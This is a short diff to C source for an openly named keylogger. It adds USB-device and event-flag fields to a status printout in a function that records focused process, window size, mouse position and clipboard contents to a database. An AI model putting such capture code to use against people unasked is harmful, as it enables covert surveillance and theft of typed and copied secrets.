@@ -310,7 +310,10 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             "\n\t  | focused pid:   |%d|"
             "\n\t  | # devices:     |" AC_BOLD "%lu" AC_RESETALL
             "\n\t  | # displays:    |%d|"
+            "\n\t  | # usb devices: |%lu|"
             "\n\t  | # pids:        |%lu|"
+            "\n\t  | event flags:   |" AC_BOLD "%lu" AC_PLAIN
+            "\n\t  | event flag:    |" AC_BOLD "%s" AC_PLAIN
             "\n\t  | window size:   |x:%d|y:%d|w:%d|h:%d|"
             "\n\t  | mouse loc:     |x:%lu|y:%lu|"
             "\n\t  | clipboard:     |" AC_BOLD "%s" AC_PLAIN
@@ -331,7 +334,10 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
             LOGGED_EVENT->focused_pid,
             LOGGED_EVENT->devices_qty,
             display_qty,
+            LOGGED_EVENT->usb_devices_qty,
             vector_size(pids_v),
+            LOGGED_EVENT->event_flags,
+            LOGGED_EVENT->event_flag,
             ss.x, ss.y, ss.w, ss.h,
             LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y,
             bytes_to_string(CLIPBOARD_EVENT.raw_size), CLIPBOARD_EVENT.b64, CLIPBOARD_EVENT.raw,
